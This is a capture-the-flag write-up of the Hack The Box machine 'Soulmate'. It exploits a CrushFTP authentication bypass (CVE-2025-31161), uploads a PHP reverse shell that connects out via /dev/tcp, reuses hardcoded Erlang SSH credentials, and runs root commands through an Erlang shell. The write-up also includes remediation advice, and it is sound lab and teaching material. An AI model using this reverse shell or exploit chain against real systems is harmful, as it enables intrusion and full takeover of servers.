# Soulmate — Hack The Box

![Soulmate](../images/Soulmate.png)

**Machine:** Soulmate  
**Difficulty:** Easy  
**OS:** Linux  
**IP:** 10.10.11.86  
**Release Date:** 2025-10-30  
**Tags:** CrushFTP, Authentication Bypass, CVE-2025-31161, File Upload, Erlang SSH, Privilege Escalation

---

## Table of Contents

1. [Summary](#summary)
2. [Reconnaissance](#reconnaissance)
3. [Initial Access](#initial-access)
4. [Privilege Escalation to User](#privilege-escalation-to-user)
5. [Privilege Escalation to Root](#privilege-escalation-to-root)
6. [Summary of Exploits](#summary-of-exploits)
7. [Remediation](#remediation)
8. [Tools](#tools)

---

## Summary

Soulmate is an Easy Linux box that exposes a CrushFTP web interface vulnerable to an authentication bypass (CVE-2025-31161). After creating an admin user through the vulnerability, I uploaded a PHP reverse shell via the web UI and obtained a `www-data` shell. I discovered hardcoded SSH credentials in an Erlang startup script, used them to access an Erlang-based SSH service running as root, and executed commands via the Erlang shell to achieve root access.

**Attack Path:**  
Web enumeration → CrushFTP auth bypass → File upload (PHP shell) → Erlang service enumeration → Hardcoded credentials → Erlang SSH (root) → Root flag

---

## Reconnaissance

### Port Scanning

Initial nmap scan to discover open services:

```bash
nmap -sC -sV -oN nmap_initial.txt 10.10.11.86
```

**Key Results:**

```
22/tcp open  ssh     OpenSSH 8.9p1
80/tcp open  http    nginx 1.18.0
```

### Hostname Configuration

Added hostname entries for easier navigation:

```bash
echo "10.10.11.86 soulmate.htb" | sudo tee -a /etc/hosts
echo "10.10.11.86 ftp.soulmate.htb" | sudo tee -a /etc/hosts
```

### Virtual Host Discovery

Enumerated virtual hosts using ffuf:

```bash
ffuf -u http://10.10.11.86/ -H 'Host: FUZZ.soulmate.htb' \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -ac -t 50
```

**Discovery:**
- Found `ftp.soulmate.htb` virtual host
- Running CrushFTP version 11.W.657

---

## Initial Access

### CVE-2025-31161: CrushFTP Authentication Bypass

CVE-2025-31161 is an authentication bypass vulnerability that allows creating admin users without authentication.

**Exploitation Steps:**

1. Search for available exploit:

```bash
searchsploit -m 52295
```

2. Check if target is vulnerable:

```bash
python3 52295.py --target ftp.soulmate.htb --port 80 --check
```

3. Create admin user:

```bash
python3 52295.py --target ftp.soulmate.htb --port 80 --exploit \
  --new-user hackerman --password 'Password123!'
```

**Access Credentials:**
- URL: `http://ftp.soulmate.htb/WebInterface/login.html`
- Username: `hackerman`
- Password: `Password123!`

### Web Shell Upload

1. Located web root directory `/webProd/` via CrushFTP file browser
2. Created PHP reverse shell:

```bash
cat > revshell.php << 'EOF'
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.114/4444 0>&1'");
?>
EOF
```

3. Uploaded `revshell.php` to `/webProd/` via CrushFTP interface

4. Started netcat listener:

```bash
nc -lvnp 4444
```

5. Triggered the shell:

```bash
curl http://soulmate.htb/revshell.php
```

6. Stabilized the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

✅ **Initial shell obtained as `www-data`**

---

## Privilege Escalation to User

### Service Enumeration

Checked listening ports for internal services:

```bash
netstat -tulnp
```

**Key Findings:**
- `127.0.0.1:2222` — Internal SSH service (Erlang-based)
- `0.0.0.0:4369` — EPMD (Erlang Port Mapper Daemon)

### Erlang Service Discovery

Located Erlang service files:

```bash
find / -name "*erlang*" -type f 2>/dev/null
cat /etc/systemd/system/erlang_ssh.service
```

**Service Configuration:**

```
ExecStart=/usr/local/bin/escript /usr/local/lib/erlang_login/start.escript
User=root
```

The Erlang SSH service runs as root, making it a high-value target.

### Hardcoded Credentials Discovery

Read the startup script:

```bash
cat /usr/local/lib/erlang_login/start.escript
```

**Found hardcoded credentials:**

```erlang
{user_passwords, [{"ben", "HouseH0ldings998"}]}
```

### SSH Access as User

Authenticated via SSH using discovered credentials:

```bash
ssh ben@10.10.11.86
# Password: HouseH0ldings998
```

**User Flag:**

```bash
cat /home/ben/user.txt
# HTB{redacted}
```

✅ **User flag captured**

---

## Privilege Escalation to Root

### Sudo Enumeration

Checked sudo privileges:

```bash
sudo -l
```

No sudo privileges available for user `ben`.

### Erlang SSH Exploitation

Connected to the Erlang SSH service running on localhost:

```bash
ssh ben@127.0.0.1 -p 2222
# Password: HouseH0ldings998
```

This provided access to an Erlang shell:

```
Eshell V15.2.5
(ssh_runner@soulmate)1>
```

### Root Command Execution

Erlang's `os:cmd/1` function executes commands as the Erlang process user (root):

**Verify root access:**

```erlang
os:cmd("whoami").
% "root\n"
```

**Capture root flag:**

```erlang
os:cmd("cat /root/root.txt").
% "HTB{redacted}\n"
```

✅ **Root flag captured**

---

## Summary of Exploits

| Stage | Vulnerability | Technique | Result |
|-------|---------------|-----------|--------|
| 1 | CrushFTP Auth Bypass | CVE-2025-31161 | Admin user creation |
| 2 | File Upload | PHP reverse shell | www-data shell |
| 3 | Hardcoded Credentials | Erlang startup script | SSH access as ben |
| 4 | Privilege Escalation | Erlang SSH (root) | Root access |

---

## Remediation

### Critical Security Issues

1. **CVE-2025-31161 (CrushFTP Authentication Bypass)**
   - Apply vendor patches immediately
   - Update CrushFTP to a fixed version
   - Monitor for unauthorized user creation

2. **File Upload Vulnerabilities**
   - Implement strict file upload validation
   - Block executable file types (PHP, JSP, etc.)
   - Store uploads outside web root
   - Use content-type and magic byte validation

3. **Hardcoded Credentials**
   - Remove hardcoded credentials from code
   - Implement secure credential storage (environment variables, secrets management)
   - Rotate all discovered credentials
   - Use least privilege service accounts

4. **Service Configuration**
   - Run services with least privilege (avoid root)
   - Restrict network exposure of sensitive services
   - Implement proper authentication and authorization
   - Use configuration management tools for secure deployment

### Best Practices

- Regular security audits of application code
- Automated dependency scanning (SAST/DAST)
- Network segmentation to limit lateral movement
- Logging and monitoring for suspicious activities
- Regular penetration testing and vulnerability assessments

---

## Tools

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service enumeration |
| `ffuf` | Virtual host enumeration |
| `searchsploit` | Exploit database search |
| `netcat` | Reverse shell listener |
| `curl` | HTTP requests and shell triggering |
| `ssh` | Remote access and service enumeration |
| `python3` | Shell stabilization |

---

**Author:** Erviano Florentino Susanto  
**Platform:** Hack The Box  
**Date:** 2025-10-30  
**Flags:** User `HTB{redacted}`, Root `HTB{redacted}`

---

*This writeup is for educational purposes only. Always obtain proper authorization before testing security vulnerabilities.*
